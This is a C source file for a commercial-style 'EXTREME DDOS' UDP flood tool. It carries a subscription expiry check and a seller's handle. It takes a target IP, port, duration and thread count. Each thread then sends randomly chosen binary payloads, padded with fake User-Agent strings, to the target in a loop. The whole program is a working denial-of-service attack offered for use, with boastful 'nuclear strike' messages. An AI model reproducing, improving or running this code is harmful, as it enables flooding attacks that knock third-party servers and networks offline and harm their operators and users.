#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>

#define EXPIRY_YEAR 2024
#define EXPIRY_MONTH 12
#define EXPIRY_DAY 31

int running = 1;

// Function to check the expiry date
void check_expiry_date() {
    time_t now = time(NULL);
    struct tm expiry = {0};

    expiry.tm_year = EXPIRY_YEAR - 1900; // Year since 1900
    expiry.tm_mon = EXPIRY_MONTH - 1;    // Month 0-11
    expiry.tm_mday = EXPIRY_DAY;

    time_t expiry_time = mktime(&expiry);

    if (now > expiry_time) {
        printf("\n================= WARNING =================\n");
        printf("   🚨 THIS FILE HAS EXPIRED! 🚨\n");
        printf("   Renew your subscription to EXTREME DDOS\n");
        printf("   Contact @PRASHANTGODORWOT for renewal.\n");
        printf("   Remember, true power lies in EXTREME DDOS.\n");
        printf("============================================\n");
        exit(1);
    }
}

// Array of User-Agent strings
char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "curl/7.64.1",
    "Python-urllib/3.9",
    "Chrome/92.0.4515.131 Safari/537.36",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
};

int user_agent_count = sizeof(user_agents) / sizeof(user_agents[0]);

// Array of payloads to be sent
char *payloads[] = {
      "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
   "\x01\x66\xD6\x9A\x2C\x4B\x35\x06\x58\x34\xDB\x94\x19\xB8\x7D\x9C  \xA0\x80\x5F\x45\x22\x99\xC6\xE8\x99\x25\x47\x76\xBC\x1C\xC1\x33  \x6C\x5A\x20\xFE\x7A\xD1\x3E\x44\x91\x25\xE7\x66\xEE\x00\x60\xE1  \x33\x7A\x45\x63\x9E\x13\xE2\x35\xF6\x80\xB3\xEB\xA9\x94\x9C\xA5  \xAD\x38\x3D\x14\x4A\x2B\x9E", 
 "\x01\x66\xD6\x9A\xD0\x4B\x2E\x9A\x8E\x01\x3F\xD4\x59\xE7\x18\x21\x0B\x2A\x56\x16\x43\x0D\xE8\x70\xF4\x2B\x84\xDB\xD2\x8D\xA5\xB2\x16\x0F\x56\xC5\x93\x3C\xB7\xE0\xD9\x0A\xAF\xD6\xDA\x3B\x13\xDE\xD3\x8C\x38\x6A\x81\x15\x66\x38\x0B",
"\xE5\x77\xE6\xC6\xB1\xE5\xB3\xBB\x5F\xE6\x5A\xEC\x4B\x30\x23\x6A\x13\x42\xCE\x16\xAC\x60\xDC\x37\x5F\x57\x9B\xBB\x90\xB7\x04\xCE\xC1\x6A\x83\xC1\xC2\x3A\x43\x19",
"\xE1\xC5\x9B\x7F\x77\x2E\xA6\xBD\xFC\xCA\x51\x95\xB6\x8C\x2A\x46\x7F\x68\x71\x69\x5D\xF9\xC3\xBC\x89\x4A\x5E\x6C\x40\x2E\x1D\xC1\x07\x46\x25\x1D\xD5\x03\x3D",
"\xE1\xC5\x9B\x7F\x5B\x2E\xE5\x06\x46\xCB\xB1\x81\x76\x3E\xD7\x73\xFC\xA6\xEB\x15\xC8\xBE\xDA\x5F\xCC\x15\x26\x13\x26\xCF\x58\x24\x1A\x82\x57\x9B\x42\x29\x24\x0B\xC3\x86\xFC\x01\x49\x9D\x97\xFC",
"\xA4\x90\x6C\xB9\xDD\x90\x74\x3B\x82\x54\x12\x20\x10\xC6\x37\xC7\x00\x76\x70\xDD\x4E\xB0\xB1\x06\x57\x39\x95\xD3\xCC\x82\x98\xCA\xC6\x5B\x88\xC4\xFF\x83\xCD\x71\xB1\x14\x8F\xDB\x92\xFC\x85\x32\x74\x87\xAC\x7A\x28\x53\xA6\xB0\xD4\x9A\x75\x26\x14\xB8\x06\x37\x28\x89\x72\x8F\xE9\x65\x70\x72\x5F\x2D\x00\xF1\xE5\xCD\x92\xFD\xCC\x38\xDF\x25\x8C",
"\x24\x91\x34\xB9\xF1\x90\x62\x1B\x2B\x50\xD1\xA1\xB6\xBC\x5D\x10\x05\xCB\xE7\x41\x43\x97\x11\xAE\xC0\x8A\xA2\xD3\x74\x04\x03\x0C\x51\xC9\x4D\x05\x3F\x92\xCE\xD2\xA7\xBB\x05\xC5\x63\x0E\xE8\x18\xD8\x56\x0E\x43\x72\xC6\xA6\x8C\xC5\x49\x94\x57\x75\x93\x07\xE8\xBC\x62\x1F\x7D\xD8\xF4\x43\x37\x36\xB7\x03\x44\xEB\x54\xC5\x8C\x84\x2A\x8B\x36\x6E\x44\xB5\xFC\x2E\xA2\x6A\x1A",
"\x2C\x91\x3C\xB9\xF5\x90\x60\x1B\x34\x60\x8A\x8B\x7A\x3D\x7E\x8D\x19\xFE\xB6\x4A\x4D\x02\x46\xFA\x69\xC7\x61\xF4\xF2\xED\x92\xCF\xF2\xCB\x80\x3D\x94\xFC\x2C\xD7\x52\xA8\x76\xBE\xD5\x2A\x32\xA6\x52\x3F\x43\x91\x08\xDF\x7A\x8D\xF2\xD2\xF1\x77\x0D\x90\xA7\x3B\x8C\xEC\x23\x5E\xEA\xD0\x19\x64\xFA\x53\x11\xBD\x1F\xC3\x80\xF9\x58\xB3\x96\x46\x5D\x2E\x52\xDC\x1D\xF3",
"\x68\x91\x37\x1C\xEB\x58\x01\x26\x44\x14\x64\x58\x63\x83\x1B\xD8\x71\xBA\xFC\x5D\xAD\x03\x0E\x31\x82\x79\xF3\xE6\xED\xF4\xC3\xF0\xF6\x4F\x55\xCD\xB3\x47\x2E\x55\x35\xD2\x67\x69\x51\x2F\xB5\xBA\x80\x17\xDE\x9B\x93\x87\x4B\x6B\x59\x13\x1F\x42\xF5\x69\x07\x3B\x42\xB5\x15\x1B\xEA\x97\x5A\xC5\x11\xE2\x72\x15\x9B\xAD\x83\x19\x6C\x3B\x2B\x24\xE7\xBB\xD3\x4B\x35\x51\xB6\xE5\xD8\x33\x33\x56\xFB",
"\x52\xEC\x28\x4E\x67\x08\x0F\x32\x84\x49\xBE\xB4\xD6\x46\x59\x7D\x03\x0E\x7E\x8D\x06\xC1\x6F\x2C\x78\x31\xCF\x1B\x2B\x65\x98\x6E\xF9\xDA\x0C\xEC\x23\xCD\x20\x63",
"\xB6\x28\xFF\x2E\x31\x84\x1B\x29\x79\xBB\x04\xD1\x13\xDB\x10\x10\xC4\xCA\x76\xFB\x12\xBF\x4F\x06\x6A\x2C\x74\xA2\xEE\x3A\x8E\xE6\x0A\x96\x40\x05\xD1\xC3\xFA\xC9\xA5\x56\x8B\x89\xF2\x8D\x51\xB1\xC2\x32\x88\xD6",
"\xB6\x28\xFF\x2E\x65\x84\x0E\x5C\x61\x92\xE8\xE6\x25\x70\x13\x3D\xD1\x32\x7D\x8A\xCF\xDD\x28\x9A\xDF\x3A\x86\x6D\xBE\x10\x51\x49\xF8\x7A\xFB\x55\x1A\x19\xD9\xF5\xA3\x57\xD1\xE4\xA6\x0F\x99\xBE\x1C\x3D\x0A\x50\x49\x2A",
"\x2D\x6E\xFF\xE0\xA1\xB0\x09\xDE\xCC\x4D\x46\x3C\x58\x8A\x98\x61\x8D\xB4\x8D\xF9\x76\x8D\x1D\x39\xF8\x78\x6A\x43\x89\x53\x4D\xB7\xB1\x33\x7F\x2E\x17\x54\xCC\x76\x88\xE9\x92\xC6\xB7\x64\xDA\x11\x8F\x5F\x4A\xB5\xA2\xC7\xB3\x37\x9A"
};

int payload_count = sizeof(payloads) / sizeof(payloads[0]);

// Function to generate and send packets
void *send_packets(void *arg) {
    struct sockaddr_in *target = (struct sockaddr_in *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket error");
        pthread_exit(NULL);
    }

    char buffer[2048];
    int i = 0;
    while (running) {
        // Clear buffer and prepare payload
        memset(buffer, 0, sizeof(buffer));
        
        // Randomly pick a User-Agent
        int random_ua = rand() % user_agent_count;
        // Randomly pick a payload
        int random_payload = rand() % payload_count;

        // Create packet with payload and User-Agent
        snprintf(buffer, sizeof(buffer), "%s\nUser-Agent: %s\n", payloads[random_payload], user_agents[random_ua]);

        // Send packet
        sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)target, sizeof(struct sockaddr_in));

        i = (i + 1) % payload_count; // Cycle through payloads
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }

    check_expiry_date();
// Nuclear-Level Custom Messages
    printf("💣 API Key Status: Unleashed! Valid until 28th October 2024\n");
    printf("🔥 Validation Protocol: Successfully breached!\n");
    printf("🚀 Launching atomic download... (Binary Version 2.1)\n");
    printf("💥 Binary secured in a fortified temporary location!\n");
    printf("⚡⚠️ NUCLEAR STRIKE INITIATED by @PRASHANTGODORWOT! Brace for impact!\n");

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads_count = atoi(argv[4]);

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(ip);

    srand(time(NULL)); // Seed random for User-Agent selection

    pthread_t threads[threads_count];

    for (int i = 0; i < threads_count; i++) {
        pthread_create(&threads[i], NULL, send_packets, (void *)&target);
    }

    sleep(duration);
    running = 0;

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished!\n");
    return 0;
}